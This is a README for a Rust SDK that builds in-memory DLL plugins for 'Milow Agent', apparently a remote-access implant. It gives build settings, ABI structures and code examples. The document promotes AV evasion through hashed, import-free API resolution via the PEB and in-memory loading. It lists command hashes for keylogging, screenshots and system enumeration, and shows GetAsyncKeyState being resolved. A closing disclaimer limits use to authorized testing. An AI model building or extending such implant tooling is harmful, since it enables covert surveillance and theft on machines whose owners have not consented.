# DR-Plugins-SDK

![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)
![Rust](https://img.shields.io/badge/Rust-1.75+-orange.svg)
![no_std](https://img.shields.io/badge/no_std-yes-lightgrey.svg)
![Windows](https://img.shields.io/badge/Platform-Windows-green.svg)

**SDK для разработки плагинов Milow Agent на Rust** — высокопроизводительный, типобезопасный, полностью `no_std`.

## 📋 Описание

DR-Plugins-SDK предоставляет инструменты для создания position-independent плагинов, которые могут динамически загружаться и выполняться в памяти без зависимостей от стандартной библиотеки Rust или внешних DLL.

### 🔥 Ключевые особенности

| Фича | Описание |
|------|----------|
| **no_std** | Работает без стандартной библиотеки Rust |
| **Type Safety** | Newtype wrappers для всех хешей и ID |
| **Builder Pattern** | Удобное создание команд |
| **ABI Версионирование** | Контроль совместимости версий |
| **PEB Resolving** | Динамическое разрешение API через PEB |
| **Compile-time хеши** | DJB2 хеши вычисляются на этапе компиляции |
| **Утилиты** | Хелперы для работы с буферами и строками |

## 🎯 Архитектура

```
DR-Plugins-SDK/
├── src/
│   ├── lib.rs          # Главный модуль, реэкспорты
│   ├── abi.rs          # ABI, PluginCallbackTable, CommandBuilder
│   ├── types.rs        # Type-safe wrappers (CmdHash, PluginId, etc.)
│   ├── error.rs        # SdkError enum + коды ошибок
│   ├── hash.rs         # DJB2 хеширование
│   ├── ffi.rs          # Windows типы и константы
│   ├── util.rs         # Утилиты (write_*, mem*, strlen)
│   ├── hashes/         # Предвычисленные хеши
│   │   ├── cmd.rs      # Хеши команд
│   │   ├── module.rs   # Хеши модулей Windows
│   │   └── api.rs      # Хеши WinAPI функций
│   └── win/            # Windows API utilities
│       ├── peb.rs      # PEB/TEB доступ
│       ├── resolver.rs # Динамический резолвинг
│       └── modules.rs  # Хелперы для модулей
├── examples/           # Примеры плагинов
└── Cargo.toml
```

## 🚀 Быстрый старт

### 1. Cargo.toml

```toml
[package]
name = "my-plugin"
version = "1.0.0"
edition = "2021"

[lib]
crate-type = ["cdylib"]

[dependencies]
milow-plugin-sdk = { git = "https://github.com/LuxVTZ/DR-Plugins-SDK" }

[profile.release]
opt-level = "z"
lto = true
panic = "abort"
strip = true
```

### 2. .cargo/config.toml

```toml
[build]
target = "x86_64-pc-windows-gnu"

[target.x86_64-pc-windows-gnu]
linker = "x86_64-w64-mingw32-gcc"
rustflags = ["-C", "link-arg=-nostdlib", "-C", "link-arg=-Wl,-e,_start"]
```

### 3. src/lib.rs

```rust
#![no_std]
#![no_main]

use milow_plugin_sdk::*;

const PLUGIN_ID: PluginId = PluginId::from_str(b"PING");

#[no_mangle]
pub unsafe extern "C" fn _start(table: *mut PluginCallbackTable) -> i32 {
    if !check_abi_version(table) {
        return SdkError::AbiMismatch.code() as i32;
    }

    let table = &mut *table;

    // Builder pattern (рекомендуется)
    let cmd = CommandBuilder::new(hashes::cmd::PING_HASH)
        .callback(cmd_ping)
        .plugin_id(PLUGIN_ID)
        .flags(CommandFlags::NONE)
        .build();

    for slot in table.commands.iter_mut() {
        if !slot.is_active() {
            *slot = cmd;
            table.count += 1;
            return 0;
        }
    }

    SdkError::RegistrationFailed.code() as i32
}

unsafe extern "C" fn cmd_ping(
    _task_id: u64, _data: *const u8, _data_len: usize,
    result_buf: *mut u8, result_len: *mut usize,
) -> u32 {
    write_str(result_buf, result_len, b"pong");
    SdkError::Success.code()
}

#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! { loop {} }
```

### 4. Сборка

```bash
cargo build --release
# Результат: target/x86_64-pc-windows-gnu/release/my_plugin.dll
```

## 📚 API Reference

### Type-Safe Types

| Тип | Описание | Пример |
|-----|----------|--------|
| `CmdHash` | Хеш команды (case-sensitive) | `CmdHash::new(b"ping")` |
| `ModuleHash` | Хеш модуля Windows (case-insensitive) | `ModuleHash::new(b"kernel32.dll")` |
| `ApiHash` | Хеш API функции (case-insensitive) | `ApiHash::new(b"VirtualAlloc")` |
| `PluginId` | ID плагина (8 bytes ASCII) | `PluginId::from_str(b"MYPLUGIN")` |
| `CommandFlags` | Флаги команды (bitflags) | `CommandFlags::ELEVATED` |
| `SdkError` | Коды ошибок | `SdkError::Success` |

### CommandFlags

```rust
CommandFlags::NONE         // Нет флагов
CommandFlags::ELEVATED     // Требует привилегий
CommandFlags::LONG_RUNNING // Длительная операция
CommandFlags::DESTRUCTIVE  // Изменяет систему
CommandFlags::NETWORK      // Требует сеть
CommandFlags::FILESYSTEM   // Работа с FS
```

### SdkError

```rust
SdkError::Success         // 0 - Успех
SdkError::InvalidArgs     // 1 - Неверные аргументы
SdkError::NotFound        // 2 - Не найдено
SdkError::AccessDenied    // 3 - Доступ запрещён
SdkError::AbiMismatch     // 12 - Несовместимый ABI
SdkError::RegistrationFailed // 13 - Ошибка регистрации
// ... и другие
```

### ABI Structures

#### PluginCallbackTable

```rust
#[repr(C)]
pub struct PluginCallbackTable {
    pub magic: u32,           // 0x4D4C5054 ("MLPT")
    pub abi_version: u32,     // Текущая версия (2)
    pub commands: [PluginCommand; 8],
    pub count: usize,
}
```

#### PluginCommand (32 байта)

```rust
#[repr(C, align(8))]
pub struct PluginCommand {
    pub name_hash: u32,
    pub flags: u32,
    pub callback: Option<PluginCallback>,
    pub plugin_id: u64,
    pub active: bool,
    pub _reserved: [u8; 7],
}
```

### CommandBuilder

```rust
let cmd = CommandBuilder::new(hashes::cmd::PING_HASH)
    .callback(cmd_ping)
    .plugin_id(PluginId::from_str(b"PING"))
    .flags(CommandFlags::NONE)
    .build();
```

### Windows API Resolving

#### Модули (через PEB)

```rust
use milow_plugin_sdk::win;

let kernel32 = win::get_kernel32();  // Базовый адрес kernel32.dll
let ntdll = win::get_ntdll();        // Базовый адрес ntdll.dll
let user32 = win::get_user32();      // Базовый адрес user32.dll
let gdi32 = win::get_gdi32();        // Базовый адрес gdi32.dll
let iphlpapi = win::get_iphlpapi();  // Базовый адрес iphlpapi.dll

// Поиск модуля по хешу
let module = win::get_module_by_hash(ModuleHash::new(b"user32.dll"));
```

#### Функции

```rust
use milow_plugin_sdk::{resolve_api, hashes};

// Резолвинг функции через макрос
let get_async_key_state: ffi::GetAsyncKeyStateFn = match resolve_api!(
    user32,
    ffi::GetAsyncKeyStateFn,
    hashes::api::GETASYNCKEYSTATE
) {
    Some(f) => f,
    None => return SdkError::FunctionNotFound.code(),
};

// Использование
let state = get_async_key_state(0x41); // VK_A
```

#### Ручной резолвинг

```rust
use milow_plugin_sdk::win;

let module = win::get_kernel32();
let proc = win::get_proc_by_hash(module, ApiHash::new(b"VirtualAlloc"));

if !proc.is_null() {
    let virtual_alloc: unsafe extern "system" fn(*mut u8, usize, u32, u32) -> *mut u8
        = core::mem::transmute(proc);
    // ...
}
```

### Утилиты

| Функция | Описание |
|---------|----------|
| `write_str(buf, len, data)` | Записать строку в буфер |
| `write_decimal(val, dst, offset)` | Записать число как строку |
| `write_hex_byte(val, dst, offset)` | Записать hex byte |
| `write_ipv4(addr, dst, offset)` | Записать IPv4 адрес |
| `copy_str(src, dst, offset, max)` | Копировать строку |
| `utf16_to_ascii(src, len, dst, max)` | UTF-16 → ASCII |
| `read_input(data, len)` | Получить slice из входных данных |
| `memzero(ptr, len)` | Обнулить память |
| `memcmp(a, b, len)` | Сравнить память |
| `strlen(s)` | Длина null-terminated строки |

## 🔧 Предвычисленные хеши

### Команды (`hashes::cmd`)

```rust
hashes::cmd::PING_HASH          // "ping"
hashes::cmd::SCREENSHOT_HASH    // "screenshot"
hashes::cmd::KEYLOG_START_HASH  // "keylog_start"
hashes::cmd::PROCLIST_HASH      // "proclist"
hashes::cmd::ENVVARS_HASH       // "envvars"
hashes::cmd::NETINFO_HASH       // "netinfo"
hashes::cmd::DISKINFO_HASH      // "diskinfo"
```

### Модули (`hashes::module`)

```rust
hashes::module::KERNEL32_HASH   // "kernel32.dll"
hashes::module::NTDLL_HASH      // "ntdll.dll"
hashes::module::USER32_HASH     // "user32.dll"
hashes::module::GDI32_HASH      // "gdi32.dll"
hashes::module::IPHLPAPI_HASH   // "iphlpapi.dll"
```

### API (`hashes::api`)

```rust
hashes::api::VIRTUALALLOC_HASH
hashes::api::VIRTUALFREE_HASH
hashes::api::GETASYNCKEYSTATE_HASH
hashes::api::GETDC_HASH
hashes::api::RELEASEDC_HASH
hashes::api::BITBLT_HASH
hashes::api::GETDIBITS_HASH
hashes::api::NTQUERYSYSTEMINFORMATION_HASH
// ... и многие другие
```

## 🛠️ Профили сборки

### Release (по умолчанию)

```toml
[profile.release]
opt-level = "z"      // Максимальная оптимизация размера
lto = true           // Link-Time Optimization
codegen-units = 1    // Последовательная компиляция
panic = "abort"      // Без обработки паник
strip = true         // Удаление символов
```

### Debug

```toml
[profile.dev]
opt-level = 0        // Без оптимизации
panic = "abort"      // Для консистентности
```

## 📊 Сравнение с традиционными плагинами

| Характеристика | SDK Approach | Традиционный |
|----------------|--------------|--------------|
| Размер | 2-15 KB | 50-200 KB |
| Импорты | Нет (PEB) | Требуются |
| Зависимости | Только SDK | CRT, DLL |
| ASLR | Да | Да |
| Статический анализ | Сложный | Легкий |
| Загрузка | В память | На диск |
| Cross-platform | Да (только Windows) | Нет |

## 🎨 Паттерны проектирования

### 1. Newtype Pattern

Все хеши и ID обёрнуты в типобезопасные структуры:

```rust
pub struct CmdHash(pub u32);  // Нельзя случайно перепутать с ApiHash
pub struct PluginId(pub u64); // Отдельный тип от u64
```

### 2. Builder Pattern

Удобное создание команд:

```rust
let cmd = CommandBuilder::new(hash)
    .callback(handler)
    .plugin_id(id)
    .flags(flags)
    .build();
```

### 3. Zero-cost Abstractions

Все обёртки компилируются в простые типы:

```rust
// CmdHash::new(b"ping") -> 0x7c9e6865 (константа на этапе компиляции)
```

### 4. Compile-time Computation

Хеши вычисляются на этапе компиляции:

```rust
pub const PING_HASH: CmdHash = CmdHash::from_raw(djb2(b"ping"));
// Компилируется в: CmdHash(0x7c9e6865)
```

## 📦 Установка

### Через git

```toml
[dependencies]
milow-plugin-sdk = { git = "https://github.com/LuxVTZ/DR-Plugins-SDK", tag = "v3.0.0" }
```

### Локально

```toml
[dependencies]
milow-plugin-sdk = { path = "../DR-Plugins-SDK" }
```

## 🔬 Продвинутые возможности

### Работа с PEB

```rust
use milow_plugin_sdk::win::peb;

let peb = peb::get_peb();  // Получить PEB текущего процесса
let teb = peb::get_teb();  // Получить TEB текущего потока
let pid = peb::get_current_pid();
let tid = peb::get_current_tid();
```

### Динамическая загрузка DLL

```rust
use milow_plugin_sdk::win::load_library;

let my_dll = load_library(b"mydll.dll\0".as_ptr());
if !my_dll.is_null() {
    let func = get_proc_by_hash(my_dll, ApiHash::new(b"MyFunction"));
}
```

### Работа с буферами

```rust
use milow_plugin_sdk::util;

unsafe {
    // Безопасная запись в буфер
    util::write_str(result_buf, result_len, b"Hello");

    // Копирование данных
    util::memcpy(dest, src, len);

    // Обнуление
    util::memzero(ptr, len);

    // Сравнение
    if util::memcmp(a, b, len) {
        // ...
    }
}
```

## 🧪 Тестирование

```bash
# Unit tests (требует std)
cargo test

# Проверка размера
cargo build --release
size target/x86_64-pc-windows-gnu/release/*.dll

# Проверка зависимостей
objdump -p target/x86_64-pc-windows-gnu/release/*.dll | grep "DLL Name"
# Должен быть пустым (без импортов)
```

## 📝 Примеры плагинов

См. `examples/ping_plugin.rs` для полного примера.

## 🔒 Безопасность

### Что SDK делает для безопасности:

1. **Type Safety** — предотвращает путаницу типов
2. **Bounds Checking** — утилиты проверяют границы
3. **ABI Validation** — проверка версии ABI
4. **Memory Safety** — все операции через unsafe, но с документацией

### Что разработчик должен обеспечить:

1. **Валидные указатели** — проверять перед использованием
2. **Размеры буферов** — не превышать MAX_RESULT_SIZE
3. **Null checks** — проверять возвращаемые значения
4. **Panic handler** — всегда реализовывать `#[panic_handler]`

## 🤝 Contributing

PR приветствуются! Пожалуйста:

1. Форматируйте код: `cargo fmt`
2. Проверяйте линтер: `cargo clippy`
3. Тесты должны проходить: `cargo test`
4. Документируйте новые API

## 📄 License

MIT License - см. [LICENSE](LICENSE) для деталей.

## 🔗 Связанные репозитории

- **[DR-Plugins](https://github.com/LuxVTZ/DR-Plugins)** — Коллекция готовых плагинов
- **[DR-Agent-Milow](https://github.com/LuxVTZ/DR-Agent-Milow)** — Основной агент

## 🚀 Roadmap

- [x] v1.0 — Базовый SDK (no_std, ABI v1)
- [x] v2.0 — Type-safe wrappers, Builder pattern
- [x] v3.0 — PEB resolving, утилиты, хеши
- [ ] v4.0 — Async API, планировщик задач
- [ ] v5.0 — Шифрование коммуникаций

---

**⚠️ Disclaimer**: This software is for educational and authorized security testing purposes only. Use only on systems you own or have explicit permission to test.